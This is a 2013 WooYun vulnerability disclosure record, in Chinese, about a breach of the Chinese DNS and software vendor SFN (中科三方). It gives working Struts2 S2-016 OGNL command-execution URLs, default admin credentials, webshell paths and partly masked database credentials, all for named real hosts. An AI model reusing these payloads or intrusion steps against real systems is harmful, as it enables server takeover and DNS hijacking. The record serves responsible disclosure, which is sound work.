{"id": 9814, "wybug_id": "wooyun-2013-032417", "wybug_title": "中科三方漏洞打包（部分漏洞可进行域名劫持）", "wybug_corp": "中科三方", "wybug_author": "Sct7p", "wybug_date": "2013-07-26 15:37", "wybug_open_date": "2013-09-09 15:38", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传", "安全意识不足", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向公众公开  简要描述： RT 详细说明：  中科三方这个厂商貌似是中科院的。但是安全可谓是让汗颜。 \nhttp://software.sfn.cn/\n  dedecms\nhttp://software.sfn.cn/data/admin/ver.txt\n20110325  2011年的版本。。。\nhttp://software.sfn.cn/data/mysql_error_trace.inc\n  后台路径侧漏\nhttp://software.sfn.cn/sfnadmin/\n  账号admin 密码：admindedecms后台getshell 附件管理>文件式管理器  getshell\nhttp://software.sfn.cn/uploads/123.php\n shell地址 \n\n几个数据库配置（密码部分 星号）www.sfn.com.cn\n$cfg_dbname = 'sfnwebsite';$cfg_dbuser = 'guanwang';$cfg_dbpwd = 'guanwang****';$cfg_dbprefix = 'sfn';$cfg_db_language = 'utf8';\n\n$cfg_dbhost = 'localhost';$cfg_dbname = 'soft****';$cfg_dbuser = 'soft****';$cfg_dbpwd = 'soft****';$cfg_dbprefix = 'fycms';$cfg_db_language = 'utf8';\n旁站有这些\n\n在来看他的ecshop\ncloud.sfn.cn\n注入。（此处略过。升级即可）<?php// database host$db_host   = \"localhost:3306\";// database name$db_name   = \"ecshopdb\";// database username$db_user   = \"ecshop**\";// database password$db_pass   = \"ecshopdb****\"附上数据库;这个站也是跟dede在一台服务器上的。\nidns.sfn.cn\n这个才是重磅级的由于最近的struts2-16\nhttp://idns.sfn.cn/viplogin/vipdomain_regDns.do?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D\n读个路径:/usr/local/tomcat/webapps/VipService1/列个目录看看\nhttp://idns.sfn.cn/viplogin/vipdomain_regDns.do?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'ls','-la','//usr/local/tomcat/webapps/VipService1/'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}\n\nroot root  170 Jul 19 10:16 scss.jsp\n  上传....然后cat一下 发现是那个css.jsp改名。已经有大牛路过了。。。。顺路getshell一下。shell地址\nhttp://idns.sfn.cn/cc.jsp\n\n\n数据库账号密码（部分星号）\t\t<property name=\"user\" value=\"dnsre****\"></property>\t\t<property name=\"password\" value=\"dnsre****\"></property>最后主站。只发现了一个小漏洞。   mydns解析处不需要密码，可查看别人解析记录。这个应该算信息泄露吧。   好像还有dns域传送。   漏洞证明：  \n\n\n\n\n\n   修复方案：  好好检查一下开源第三方程序。把你的struts2修补了把。还有一个积分系统也是ecshop。忘记网址了   版权声明：转载请注明来源 Sct7p@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-07-30 21:59 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-26 22:37 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  能劫持xxx.gov.cn？    \n     2013-07-26 23:45 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  @无敌L.t.H 可以劫持。。。天朝法律不允许    \n     2013-07-27 12:54 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  @Sct7p 请允许我做一个兵库北的表情，洞主保重。    \n     2013-09-10 09:52 |    \t\twebmail \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 白帽子)\t\t \n  洞主威武    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}